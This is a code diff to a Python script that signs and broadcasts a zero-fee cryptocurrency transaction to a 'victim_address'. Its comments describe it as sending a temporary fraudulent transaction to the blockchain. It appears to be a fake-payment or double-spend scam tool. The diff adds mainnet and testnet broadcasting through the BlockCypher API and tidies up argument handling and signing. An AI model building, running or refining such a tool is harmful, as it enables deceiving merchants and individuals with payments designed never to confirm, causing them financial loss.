@@ -17,12 +17,13 @@ parser.add_argument("fake_send_to",
 parser.add_argument("amount_of_coins",
                     help="Amount of coins sent. The maximum amount delayed will vary depending on send_from.",
                     type=float)
-parser.add_argument("blockcypher_token",
-                    help="blockcypher_apikey",
+parser.add_argument("--blockcypher_token",
+                    "-token",
+                    help="blockcypher_apikey  It might be possible to do it successfully with BTC.",
                     type=str)
 parser.add_argument("--coin-symbol",
                     "-coin",
-                    help="Coin symbol.  btc, litecoin (Default=btc)",
+                    help="Coin symbol.  btc, ltc (Default=btc)",
                     type=str,
                     default="btc")
 parser.add_argument("--is_testnet",
@@ -103,16 +104,10 @@ fee = 0 # ここはマインングできないくらい著しく小さな値に�
 
 change_btc_amt = (balance - send_amount) - fee #おつり
 
-if testnet:
-    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": sender, "value": change_btc_amt}]
-else:
-    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": sender, "value": change_btc_amt}]
+tx_victim = [{"address": victim_address, "value": send_amount}, {"address": sender, "value": change_btc_amt}]
 
 tx_victim = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
-if testnet:
-    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
-else:
-    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
+tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
 
 print(inputs)
 print()
@@ -138,9 +133,22 @@ time.sleep(3) #詠唱中...  -u-
 
 print("SND TMP ITX TOBC  (ブロックチェーンに一時的な不正なトランザクションを送信!)")
 time.sleep(2)
-blockcypher.pushtx(tx_victim,
-                   coin_symbol=coin_symbol,
-                   api_key=token)
+
+if "btc" == coin_symbol:
+    if testnet:
+        print(blockcypher.pushtx(tx_victim,
+                        coin_symbol=f"{coin_symbol}-testnet",
+                        api_key=token))
+    else:
+        print(blockcypher.pushtx(tx_victim,
+                        coin_symbol=coin_symbol,
+                        api_key=token))
+
+elif not testnet:
+    print(blockcypher.pushtx(tx_victim,
+                    coin_symbol=coin_symbol,
+                    api_key=token))
+
 
 #txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=0)
 #transaction_util.pushtx(tx_victim)
